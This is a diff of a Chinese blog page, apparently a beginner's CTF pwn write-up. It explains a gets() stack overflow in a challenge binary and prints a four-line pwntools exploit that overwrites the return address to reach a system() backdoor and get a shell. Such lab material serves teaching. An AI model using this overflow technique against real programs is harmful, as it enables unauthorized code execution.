@@ -312,7 +312,7 @@ PS：这一次比赛中遇到的简单题目，也是我做出来的第一个pwn
 废话不多说，拿到一个名为h2的题目，用ida打开（我们通过F5可以看到题目的伪代码）
 int __cdecl main(int argc, const char **argv, const char **envp)
 </code></pre><p>{<br>  char s; // [rsp+0h] [rbp-80h]</p>
-<p>  puts(“Hello world!”);<br>  puts(“WHO ARE YOU:”);<br>  gets(&amp;s, argv);<br>  printf(“HELLO “);<br>  puts(&amp;s);<br>  return 0;<br>}<br>}  （此为F5中的伪代码，非常简单）<br>    get函数是一个危险函数，当终端的输入量过大的时候，就会造成栈溢出，同时我们在ida左侧的Functions window下面看到了system函数，<br>    有基础的人看到这里，一定觉得题目也过于简单了吧，竟然留后门，但是这个题目可以帮助小白们很好的理解栈溢出原理和它的可怕之处。<br>    system():<br>    _system    .plt    00000000004004B0    00000006            R    .    .    .    .    T    .<br>    有了system的地址，我们只需要让程序执行它就可以了，在linux系统中运行h2，gdb测量一下就知道栈空间大小为136，<br>    那么我们就写exp了吧：<br>    {<br>        from pwn import <em><br>        sh = process(“h2”)<br>        sh.sendline(“a”</em>136+p64(0x4005f6))<br>        sh.interactive()<br>    }（就是这简单，四行代码getshell）</p>
+<p>  puts(“Hello world!”);<br>  puts(“WHO ARE YOU:”);<br>  gets(&amp;s, argv);<br>  printf(“HELLO “);<br>  puts(&amp;s);<br>  return 0;<br>}<br>  （此为F5中的伪代码，非常简单）<br>    get函数是一个危险函数，当终端的输入量过大的时候，就会造成栈溢出，同时我们在ida左侧的Functions window下面看到了system函数，<br>    有基础的人看到这里，一定觉得题目也过于简单了吧，竟然留后门，但是这个题目可以帮助小白们很好的理解栈溢出原理和它的可怕之处。<br>    system():<br>    _system    .plt    00000000004004B0    00000006            R    .    .    .    .    T    .<br>    有了system的地址，我们只需要让程序执行它就可以了，在linux系统中运行h2，gdb测量一下就知道栈空间大小为136，<br>    那么我们就写exp了吧：<br>    {<br>        from pwn import <em><br>        sh = process(“h2”)<br>        sh.sendline(“a”</em>136+p64(0x4005f6))<br>        sh.interactive()<br>    }（就是这简单，四行代码getshell）</p>
 <p>说明： 如果想要试试的话可以到我的github上下载题目 <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:shizhongpwn/pwnstudy.git</p>
 
           
